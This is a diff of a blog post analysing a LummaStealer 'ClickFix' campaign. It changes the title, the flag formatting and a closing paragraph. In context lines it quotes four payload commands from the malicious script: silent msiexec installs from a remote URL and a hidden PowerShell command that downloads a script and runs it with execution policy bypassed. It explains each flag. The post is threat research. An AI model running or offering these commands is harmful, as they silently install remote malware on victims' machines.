@@ -1,6 +1,6 @@
 ---
 layout: post
-title:  "LummaStealer - Malware Analysis"
+title:  "LummaStealer - ClickFix MSI Installer Payload from compromised website"
 date:   2025-06-16 21:00:00 +1000
 categories: malware analysis
 ---
@@ -57,14 +57,14 @@ Ok now lets get into the good stuff.
 
 We can see the function (sjsh) sends a GET request to an unknown domain. When loaded, it copies the constant 'command' to the users clipboard. Now the idiots have commented out earlier payloads. So we can infact see four different payloads! Interesting there is both a powershell and multiple msiexec payloads. This goes back to my comment earlier, there is so many different payloads for Lumma. Anyway, lets have a look at what some of the flags mean in these payload commands. 
 1. ```const command = `msiexec /qn /i ${gotourl};```
-- /i = tells msiexec to install the following package
-- /qn = quiet mode with no UI for install
+- (/i) = tells msiexec to install the following package
+- (/qn) = quiet mode with no UI for install
 2. ```//const command = `msiexec KLSK=1101 /package ${gotourl} /promptrestart LAPBO=189 /quiet NIANS=299;```
 3. ```const command = `msiexec SKSIA=1401 /package ${gotourl} /promptrestart LAPBOS=119 /passive NIANS=299;```
-- /package = specifies .msi to install (same as /i)
-- /promptrestart = restarts prompt at end if needed
-- /quiet = quiet mode install
-- KLSK | LAPBO | NIANS | These aren't msiexec flags. They could potentially define custom properties in the .msi file.
+- (/package) = specifies .msi to install (same as /i)
+- (/promptrestart) = restarts prompt at end if needed
+- (/quiet) = quiet mode install
+- KLSK, LAPBO, NIANS. These aren't msiexec flags. They could potentially define custom properties in the .msi file.
 4. ```//const command = `powershell -w h -c "$f=$env:TEMP+'\\'+[guid]::NewGuid()+'.ps1';curl ${gotourl} -o $f;powershell -w h -ep Bypass -f $f"`;```
 - (-wh h) = WindowStyle and hidden
 - (-c) = command
@@ -100,5 +100,8 @@ Plot twist! You have got to be joking. So essentially what this means is. LummaS
 
 ![403 fullporner](/images/fullporner_result.PNG)
 
-No result. Strange. Perhaps it checks for user agents and only accepts from certain thingos. Anyway. Lets run this command shall we. Let's clickfix ourselves.
+No result. Strange.
+
+When I go to paste the command in run I get the domain 'veriqloudx' not 'fullporner'. Anyway, veriq was created two days ago. Pretty neat, good rep on VT. Nice.
+![VT Veriqloudx](/images/veriq_rep.PNG)
 
